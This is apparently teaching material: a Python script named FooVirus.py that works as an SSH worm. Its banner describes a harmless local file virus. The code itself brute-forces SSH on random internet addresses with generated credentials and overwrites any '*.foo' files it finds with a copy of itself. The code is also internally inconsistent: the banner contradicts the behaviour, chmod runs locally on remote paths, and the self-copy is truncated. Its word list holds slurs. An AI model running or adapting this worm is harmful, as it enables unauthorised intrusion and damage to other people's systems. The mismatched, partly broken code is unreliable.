#!/usr/bin/env python
import sys
import os
import glob
import random
import paramiko
import scp
import select
import signal


##   FooVirus.py
##   Author: Avi kak (kak@purdue.edu)
##   Date:   April 5, 2016; Updated April 6, 2022

def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 1

NHOSTS = NUSERNAMES = NPASSWDS = 3


##  The trigrams and digrams are used for syntheizing plausible looking
##  usernames and passwords.  See the subroutines at the end of this script
##  for how usernames and passwords are generated by the worm.
trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
                  bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
                  cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
                  faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
                  kim kin kip kir kis kit kix laf lad laf lag led leg lem len 
                  let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
                  odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
                  pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
                  sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 
                  wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams  = digrams.split()

def get_new_usernames(how_many):
    if debug: return ['root']      # need a working username for debugging
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] 
          if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return usernames

def get_new_passwds(how_many):
    if debug: return ['mypassword']      # need a working username for debugging
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    passwds = [ ''.join(map(lambda x:  random.sample(trigrams,1)[0] + (str(random.randint(0,9)) 
                if random.random() > 0.5 else '') if int(selector[x]) == 1 
                        else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return passwds

# '172.17.0.2', '172.17.0.3', '172.17.0.4', '172.17.0.5', '172.17.0.6', '172.17.0.7',
#                       '172.17.0.8', '172.17.0.9', '172.17.0.10', '172.17.0.11'

def get_fresh_ipaddresses(how_many):
    if debug: return ['172.17.0.2']   
                    # Provide one or more IP address that you
                    # want `attacked' for debugging purposes.
                    # The usrname and password you provided
                    # in the previous two functions must
                    # work on these hosts.
    if how_many == 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
        ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
    return ipaddresses 


print("""\nHELLO FROM FooVirus\n\n
This is a demonstration of how easy it is to write
a self-replicating program. This virus will infect
all files with names ending in .foo in the directory in
which you execute an infected file.  If you send an
infected file to someone else and they execute it, their,
foo files will be damaged also.

Note that this is a safe virus (for educational purposes
only) since it does not carry a harmful payload.  All it
does is to print out this message and comment out the
code in .foo files.\n\n""")

while True:
    usernames = get_new_usernames(NUSERNAMES)
    passwds =   get_new_passwds(NPASSWDS)
#    print("usernames: %s" % str(usernames))
#    print("passwords: %s" % str(passwds))
    # First loop over passwords
    for passwd in passwds:
        # Then loop over user names
        for user in usernames:
            # And, finally, loop over randomly chosen IP addresses
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print("\nTrying password %s for user %s at IP address: %s" % (passwd,user,ip_address))
                file_list = []
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                    print("\n\nconnected\n")
                    
                    stdin, stdout, stderr = ssh.exec_command(f"find / -type f -name '*.foo'")
                    for line in stdout:
                        file_list.append(line.strip())

                    IN = open(sys.argv[0], 'r')
                    virus = [line for (i,line) in enumerate(IN) if i < 37]

                    for item in file_list:
                        # print(f"Attacking {item}")
                        sftp = ssh.open_sftp()
                        IN = sftp.file(item, 'r')
                        # Read the contents of the remote file
                        all_of_it = IN.readlines()
                        IN.close()
                        print(all_of_it)
                        if any('foovirus' in line for line in all_of_it): continue
                        os.chmod(item, 0o777)
                        OUT = sftp.file(item, 'w')
                        OUT.writelines(virus)
                        all_of_it = ['#' + line for line in all_of_it]
                        OUT.writelines(all_of_it)
                        OUT.close()
                        sftp.close()                               
                except:
                    continue
                
    if debug: break